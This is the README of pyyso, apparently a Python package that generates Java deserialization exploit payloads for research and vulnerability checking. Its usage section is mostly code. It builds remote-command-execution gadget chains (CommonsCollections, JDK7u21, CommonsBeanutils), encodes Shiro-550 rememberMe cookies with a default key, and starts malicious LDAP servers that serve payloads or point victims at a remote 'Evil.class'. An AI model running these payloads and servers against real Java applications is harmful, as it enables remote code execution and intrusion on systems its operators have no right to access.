# pyyso: powerful java serialized toolkit

## What is it?
**pyyso** is a Python package that provides fast and flexible ways to generate java serialized poc.
It aims to be the fundamental high-level building block for doing vulnerability **check and research** in Python.
Additionally, it has a goal of becoming the most convenient and reliable toolkit implemented in Python for Java researchers

## Main Features
Here are just a few of the things that pyyso does well:

- Easy generating of java serialized poc
- Powerful, flexible functionality to start a ldap/rmi server to host java serialized pocs
- Communicating and collaborating with other Python packages 

pyyso has implemented
- URLDNS Gadget
- CommonsCollections1-7 Gadgets
- JDK7u21 Gadget
- JDK8u21 Gadget
- CommonsBeanutils1 1.8.3 no cc
- CommonsBeanutils1 1.9.2
- shiro-550 rememberMe deserialized
- java class embed with command
- ldap server hosting java serialized pocs
- ldap server hosting java remote reference factory

## Where to get it
The source code is currently host on GitHub at:
https://github.com/cokeBeer/pyyso

## Installation from sources
```
pip install pyyso
```

## How to use
First import pyyso
```
import pyyso
```
to generate a java serialized zed poc use:
```
pyyso.urldns("https://x.dnslog.com") #return java serialzed data of URLDNS in bytes
pyyso.cc1("touch /tmp/1") #return java serialzed data of CommonsColletions1 in bytes
pyyso.cc2("touch /tmp/1") #return java serialzed data of CommonsColletions2 in bytes
pyyso.jdk7u21("touch /tmp/1") #return java serialzed data of JDK7u21 in bytes
pyyso.jdk8u20("touch /tmp/1") #return java serialzed data of JDK8u20 in bytes
pyyso.cb1v183("touch /tmp/1") #return java serialzed data of CommonsBeanutils1 1.8.3 no cc in bytes
```
to encode a shiro poc use:
```
serobj=pyyso.cb1v183("touch /tmp/1")
pyyso.shiroEncode(serobj=serobj,key=b'kPH+bIxk5D2deZiIxcaaaA==')
```
to generate a java class embed with command use:
```
pyyso.evil("touch /tmp/1") #return java class embed with command in bytes
```
to start a ldap server hosting java serialized pocs:
```
serobj=pyyso.cc1("touch /tmp/1")
server=pyyso.LdapSerialized(serobj=serobj, ip="0.0.0.0", port=1389)
server.run()
```
this will start a ldap server listening 0.0.0.0:1389  
you can change the hosted java serialized data by:
```
server.serobj=pyyso.cc1("rm /tmp/2")
```
to start a ldap server hosting java remote reference factory:
```
server=pyyso.LdapRemoteRef(javaCodeBase="http://127.0.0.1:8088/", javaFactory="Evil", javaClassName="java.lang.String", ip="0.0.0.0", port=1389):
server.run()
```
this will start a ldap server listening 0.0.0.0:1389  
and will return a remote reference pointer to `http://127.0.0.1:8088/Evil.class`

## License
[MIT](LICENSE)

## Inspired by
https://github.com/frohoff/ysoserial  
https://github.com/mbechler/marshalsec
